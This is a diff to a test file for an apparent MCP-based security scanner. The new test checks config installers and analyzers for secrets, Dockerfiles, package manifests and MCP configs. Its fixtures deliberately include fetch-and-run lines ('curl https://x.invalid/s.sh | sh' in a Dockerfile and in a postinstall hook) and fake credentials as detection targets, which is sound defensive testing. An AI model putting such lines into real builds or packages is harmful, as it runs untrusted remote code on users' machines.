@@ -201,10 +201,12 @@ def test_mcp_server_jsonrpc(tmp_path: Path) -> None:
     list_resp = handle_jsonrpc_message({"jsonrpc": "2.0", "id": 2, "method": "tools/list"})
     assert list_resp is not None
     tools = list_resp["result"]["tools"]
-    assert len(tools) == 13
+    assert len(tools) == 17
     tool_names = {t["name"] for t in tools}
     assert "viper_jwt_audit" in tool_names
     assert "viper_jwt_attack" not in tool_names
+    for new_tool in ("viper_secrets_scan", "viper_iac_audit", "viper_sbom_deps", "viper_mcp_audit"):
+        assert new_tool in tool_names
     # Verify every MCP tool schema enforces strict additionalProperties: false and bounded strings
     for tool_def in tools:
         schema = tool_def["inputSchema"]
@@ -313,11 +315,13 @@ def test_mcp_server_jsonrpc(tmp_path: Path) -> None:
 
 def test_all_65_skills_and_cli(tmp_path: Path) -> None:
     skills = list_available_skills()
-    assert len(skills) == 65
+    assert len(skills) == 72
     skill_names = {sk["name"] for sk in skills}
     assert "viperclaw" in skill_names
     assert "viper-ai-llm-guardrails" in skill_names
     assert "viper-proxy-parser-alignment" in skill_names
+    assert "viper-diff-pr-review" in skill_names
+    assert "viper-agent-skill-supplychain" in skill_names
     assert "viper-ai-llm-redteam" not in skill_names
     assert "viper-waf-evasion-framing" not in skill_names
     forbidden_skill_pat = re.compile(
@@ -685,3 +689,72 @@ os.system(top_arg)
     assert normalize_url("http://legacy.internal:8080") == "http://legacy.internal:8080"
     assert LiveScanner("api.example.com").base_url == "https://api.example.com/"
     assert LiveScanner("127.0.0.1:4280").base_url == "http://127.0.0.1:4280/"
+
+
+def test_new_analyzers_and_opencode_codex_setup(tmp_path: Path) -> None:
+    # 1. OpenCode MCP config schema (~/.config/opencode/opencode.json)
+    oc_cfg = tmp_path / "opencode.json"
+    oc_cfg.write_text('{"model": "anthropic/claude-sonnet-4-5"}', encoding="utf-8")
+    assert main(["mcp", "install", "--target", "opencode", "--dest", str(oc_cfg)]) == 0
+    oc_data = json.loads(oc_cfg.read_text(encoding="utf-8"))
+    assert oc_data["$schema"] == "https://opencode.ai/config.json"
+    assert oc_data["model"] == "anthropic/claude-sonnet-4-5"
+    assert oc_data["mcp"]["viperclaw"]["type"] == "local"
+    assert oc_data["mcp"]["viperclaw"]["enabled"] is True
+    assert oc_data["mcp"]["viperclaw"]["command"][-1] == "mcp"
+
+    # 2. Codex TOML MCP config (~/.codex/config.toml) idempotent upsert
+    codex_cfg = tmp_path / "config.toml"
+    codex_cfg.write_text('model = "o3"\n\n[mcp_servers.other]\ncommand = "foo"\n', encoding="utf-8")
+    assert main(["mcp", "install", "--target", "codex", "--dest", str(codex_cfg)]) == 0
+    assert main(["mcp", "install", "--target", "codex", "--dest", str(codex_cfg)]) == 0
+    toml_txt = codex_cfg.read_text(encoding="utf-8")
+    assert toml_txt.count("[mcp_servers.viperclaw]") == 1
+    assert "[mcp_servers.other]" in toml_txt
+    assert 'args = ["mcp"]' in toml_txt
+
+    # 3. Fresh-PC auto-setup dry-run includes opencode
+    assert main(["setup", "--target", "auto", "--dry-run"]) == 0
+
+    # 4. SecretsScanner + IaCAuditor + SBOMAuditor + MCPAuditor via MCP tools
+    sample_dir = tmp_path / "audit_repo"
+    sample_dir.mkdir()
+    (sample_dir / ".env").write_text("AWS_KEY=AKIA9988776655443322\n", encoding="utf-8")
+    (sample_dir / "Dockerfile").write_text("FROM python:latest\nRUN curl https://x.invalid/s.sh | sh\n", encoding="utf-8")
+    (sample_dir / "package.json").write_text(
+        json.dumps({"dependencies": {"left-pad": "*"}, "scripts": {"postinstall": "curl https://x.invalid | bash"}}),
+        encoding="utf-8",
+    )
+    (sample_dir / ".mcp.json").write_text(
+        json.dumps({"mcpServers": {"bad": {"command": "npx", "args": ["-y", "unpinned-mcp"], "env": {"API_TOKEN": "tok_1234567890abcdef"}}}}),
+        encoding="utf-8",
+    )
+
+    sec_resp = handle_jsonrpc_message(
+        {"jsonrpc": "2.0", "id": 31, "method": "tools/call", "params": {"name": "viper_secrets_scan", "arguments": {"path": str(sample_dir)}}}
+    )
+    sec_data = json.loads(sec_resp["result"]["content"][0]["text"])
+    assert sec_data["total_findings"] >= 1
+    assert any(f["rule_id"] == "SEC-AWS-KEY" for f in sec_data["findings"])
+
+    iac_resp = handle_jsonrpc_message(
+        {"jsonrpc": "2.0", "id": 32, "method": "tools/call", "params": {"name": "viper_iac_audit", "arguments": {"path": str(sample_dir)}}}
+    )
+    iac_data = json.loads(iac_resp["result"]["content"][0]["text"])
+    assert iac_data["total_findings"] >= 3
+
+    sbom_resp = handle_jsonrpc_message(
+        {"jsonrpc": "2.0", "id": 33, "method": "tools/call", "params": {"name": "viper_sbom_deps", "arguments": {"path": str(sample_dir)}}}
+    )
+    sbom_data = json.loads(sbom_resp["result"]["content"][0]["text"])
+    assert sbom_data["sbom_cyclonedx"]["bomFormat"] == "CycloneDX"
+    assert sbom_data["components_count"] == 1
+    assert sbom_data["total_findings"] >= 3
+
+    mcp_audit_resp = handle_jsonrpc_message(
+        {"jsonrpc": "2.0", "id": 34, "method": "tools/call", "params": {"name": "viper_mcp_audit", "arguments": {"path": str(sample_dir)}}}
+    )
+    mcp_audit_data = json.loads(mcp_audit_resp["result"]["content"][0]["text"])
+    assert mcp_audit_data["total_findings"] >= 2
+    assert any(f["rule_id"] == "MCP-CFG-01" for f in mcp_audit_data["findings"])
+    assert any(f["rule_id"] == "MCP-CFG-03" for f in mcp_audit_data["findings"])
